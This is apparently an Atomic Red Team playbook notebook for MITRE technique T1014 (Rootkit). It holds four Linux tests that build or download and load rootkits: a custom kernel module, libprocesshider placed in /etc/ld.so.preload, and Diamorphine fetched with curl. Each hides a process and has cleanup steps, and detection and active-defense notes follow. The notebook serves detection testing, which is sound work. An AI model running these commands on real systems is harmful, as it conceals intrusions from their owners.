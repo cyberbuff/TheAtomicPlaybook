{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "9e604207",
   "metadata": {},
   "source": "# T1014 - Rootkit\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) \n\nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)"
  },
  {
   "cell_type": "markdown",
   "id": "4457119e",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "5ab806b3",
   "metadata": {},
   "source": "### Atomic Test #1 - Loadable Kernel Module based Rootkit\nLoadable Kernel Module based Rootkit\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n\n##### Check Prereq Commands:\n```sh\nif [ -f PathToAtomicsFolder/T1014/bin/T1014.ko ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;\ncp PathToAtomicsFolder/T1014/src/Linux/* /tmp/T1014/\ncd /tmp/T1014; make\nmkdir PathToAtomicsFolder/T1014/bin\nmv /tmp/T1014/T1014.ko PathToAtomicsFolder/T1014/bin/T1014.ko\nrm -rf /tmp/T1014\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "874a418e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "caf325d5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "893bde48",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "49b34ba2",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo rmmod T1014\nsudo rm -rf PathToAtomicsFolder/T1014/bin\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2def5cf3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "30fe5acf",
   "metadata": {},
   "source": "### Atomic Test #2 - Loadable Kernel Module based Rootkit\nLoadable Kernel Module based Rootkit\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n\n##### Check Prereq Commands:\n```sh\nif [ -f /lib/modules/$(uname -r)/T1014.ko ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nsudo apt install make\nsudo apt install gcc\nif [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;\ncp PathToAtomicsFolder/T1014/src/Linux/* /tmp/T1014\ncd /tmp/T1014; make        \nsudo cp /tmp/T1014/T1014.ko /lib/modules/$(uname -r)/\n[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014\nsudo depmod -a\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ce45ecb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f44fdaca",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo modprobe T1014\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c17fc9fc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "1490f533",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo modprobe -r T1014\nsudo rm /lib/modules/$(uname -r)/T1014.ko\nsudo depmod -a\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96b53be5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eafc4eb9",
   "metadata": {},
   "source": "### Atomic Test #3 - dynamic-linker based rootkit (libprocesshider)\nUses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: The preload library must exist on disk at specified location (#{library_path})\n\n##### Check Prereq Commands:\n```sh\nif [ -f /usr/local/lib/libprocesshider.so ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nmkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO https://github.com/gianlucaborello/libprocesshider//archive/25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && unzip 25e0587d6bf2137f8792dc83242b6b0e5a72b415.zip && cd libprocesshider-25e0587d6bf2137f8792dc83242b6b0e5a72b415\nmake\ncp libprocesshider.so /usr/local/lib/libprocesshider.so\ncp /usr/bin/ping /usr/local/bin/evil_script.py\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95f6bb2d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "0d23c8bc",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload\n/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82145717",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "8e4ea3d1",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsed -i \"\\:^/usr/local/lib/libprocesshider.so:d\" /etc/ld.so.preload\nrm -rf /usr/local/lib/libprocesshider.so /usr/local/bin/evil_script.py /tmp/atomic\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4636309",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "776c7019",
   "metadata": {},
   "source": "### Atomic Test #4 - Loadable Kernel Module based Rootkit (Diamorphine)\nLoads Diamorphine kernel module, which hides itself and a processes.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)\n\n##### Check Prereq Commands:\n```sh\nif [ -f /lib/modules/$(uname -r)/diamorphine.ko ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```sh\nmkdir -p /tmp/atomic && cd /tmp/atomic\ncurl -sLO https://github.com/m0nad/Diamorphine//archive/898810523aa2033f582a4a5903ffe453334044f9.zip && unzip 898810523aa2033f582a4a5903ffe453334044f9.zip && cd Diamorphine-898810523aa2033f582a4a5903ffe453334044f9\nmake\nsudo cp diamorphine.ko /lib/modules/$(uname -r)/\nsudo depmod -a\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3f7ec9ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "9462d34e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo modprobe diamorphine\nping -c 10 localhost >/dev/null & TARGETPID=\"$!\"\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \"process ${TARGETPID} hidden\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "74f6338b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "92f0b7d5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nkill -63 1\nsudo modprobe -r diamorphine\nsudo rm -rf /lib/modules/$(uname -r)/diamorphine.ko /tmp/atomic\nsudo depmod -a\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8804805",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1014 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3270ad69",
   "metadata": {},
   "source": "## Detection\nSome rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)"
  },
  {
   "cell_type": "markdown",
   "id": "a60f8bef",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Admin Access \n Modify a user's administrative privileges.\n \n\n Changing the target system to allow or disallow users to perform tasks requiring administrator level permissions gives the defender leverage in inhibiting or facilitating attacks.  The procedures for changing these permissions vary across different operating and software systems.\n#### Opportunity\nThere is an opportunity to block an adversary's intended action and force them to reveal additional TTPs.\n#### Use Case\nA defender could remove admin access in an attempt to force an adversary to perform privilege escalation to install a rootkit.\n#### Procedures\nRemove an account's administrative access from a system or service to require an adversary to reveal techniques for elevating privileges in order to accomplish certain tasks.\nGrant an account administrative access to a system or service to enable an adversary to take advantage of those privileges if they compromise the system or service.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}